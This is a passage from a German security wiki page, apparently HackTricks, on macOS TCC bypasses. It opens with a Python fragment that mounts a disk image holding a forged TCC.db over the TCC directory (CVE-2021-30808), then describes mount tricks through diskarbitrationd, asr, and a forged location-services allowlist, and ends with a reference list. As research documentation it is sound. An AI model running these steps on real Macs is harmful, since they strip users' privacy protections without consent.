    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Prüfe den **vollständigen Exploit** im [**originalen Write-up**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Wie im [originalen Write-up](https://www.kandji.io/blog/macos-audit-story-part2) erklärt, nutzte diese CVE `diskarbitrationd` aus.<sup>[[16]](#references)</sup>

Die Funktion `DADiskMountWithArgumentsCommon` aus dem öffentlichen `DiskArbitration`-Framework führte die Sicherheitsprüfungen durch. Diese lassen sich jedoch umgehen, indem `diskarbitrationd` direkt aufgerufen wird. Dadurch können `../`-Elemente im Pfad und Symlinks verwendet werden.

Dies ermöglichte es einem Angreifer, beliebige Mounts an jedem Ort durchzuführen, auch über der TCC-Datenbank, da `diskarbitrationd` über das Entitlement `com.apple.private.security.storage-exempt.heritable` verfügt.

### asr

Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und an einem anderen Ort zu mounten, wodurch sich die TCC-Schutzmechanismen umgehen ließen.

### CVE-2022-22655 - Ortungsdienste

Ortungsdienste werden **nicht** wie andere Dienste in einer TCC-Datenbank gespeichert. Sie werden von `locationd` verwaltet, das eine eigene Allowlist in **`/var/db/locationd/clients.plist`** führt:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Jeder Eintrag ist nach dem Client (Bundle-ID oder ausführbarer Dateipfad) indiziert und enthält Felder wie `Authorized`, `BundleId`, `Executable` und `Registered`.<sup>[[4]](#references)</sup>

Die Datei `clients.plist` selbst ist durch Sandbox/TCC geschützt und kann nicht einmal als Root bearbeitet werden – **das Verzeichnis `/var/db/locationd/` war jedoch nicht vor dem Einhängen geschützt**. Ein Angreifer mit Root-Rechten konnte also ein Disk-Image mit einer eigenen `clients.plist` erstellen (in der die eigene Binärdatei als `Authorized` markiert war), es über das Verzeichnis einhängen und `locationd` neu starten, damit die gefälschte Allowlist wirksam wurde.<sup>[[3]](#references)</sup>

> [!TIP]
> Dies folgt demselben Muster wie die obigen TCC-Bypasses mit `hdiutil`/`mount`: Die *Datei* ist geschützt, das *Verzeichnis, in dem sie liegt*, aber nicht. Daher ersetzt man das gesamte Verzeichnis statt der Datei.

## Über Startup-Apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Mit grep

In einigen Fällen speichern Dateien vertrauliche Informationen wie E-Mail-Adressen, Telefonnummern, Nachrichten usw. an ungeschützten Orten (was bei Apple als Sicherheitslücke gilt).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Das funktioniert nicht mehr, aber [**früher ging es**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Eine weitere Methode mit [**CoreGraphics-Events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Umgehung des macOS-Frameworks Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Umgehung der macOS-TCC-Benutzerdatenschutzmechanismen durch Zufall und gezielt](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 – Umgehung der TCC-Standortdienste (Originalbericht)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Wo auf der Welt ist Carmen Sandiego: Missbrauch der Standortdienste unter macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs – CVE-2024-44131: TCC-Bypass stiehlt Daten aus iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite – `test_sqllog.c` (SQLITE_ENABLE_SQLLOG-Umgebungsvariablen)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple – Berechtigung für DYLD-Umgebungsvariablen erlauben](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company – Notarisierung: die gehärtete Laufzeitumgebung](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day-TCC-Bypass in der XCSSET-Malware entdeckt](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: „Was auf deinem Mac passiert, bleibt in Apples iCloud?!“ – Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Neue macOS-Sicherheitslücke „powerdir“ könnte unbefugten Zugriff auf Benutzerdaten ermöglichen](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home-Verzeichnis ändern und TCC umgehen, auch bekannt als CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Musik abspielen und TCC umgehen, auch bekannt als CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Wie man einen (Fire)fox ausraubt](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 – TCC mit Telegram unter macOS umgehen](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji – Apple-Sicherheitslücken aufdecken: Audit von diskarbitrationd und storagekitd, Teil 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle – Objective by the Sea v2.0: Synthetische Klicks und CoreGraphics-Event-Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking – Machbarkeitsnachweis](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow – Umgebungsvariablen unter OS X festlegen](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit – CVE-2020-9771: TCC-Bypass und Rechteausweitung mit mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit – CVE-2021-30808: TCC-Bypass durch Einhängen über der TCC-Datenbank](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Über 20 Möglichkeiten, die macOS-Datenschutzmechanismen zu umgehen](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [K.o.-Sieg gegen TCC – Über 20 NEUE Möglichkeiten, die macOS-Datenschutzmechanismen zu umgehen](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Von Spotlight zu Apple Intelligence – Missbrauch eines 0day, um die Daten zu stehlen, auf denen macOS-KI basiert](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
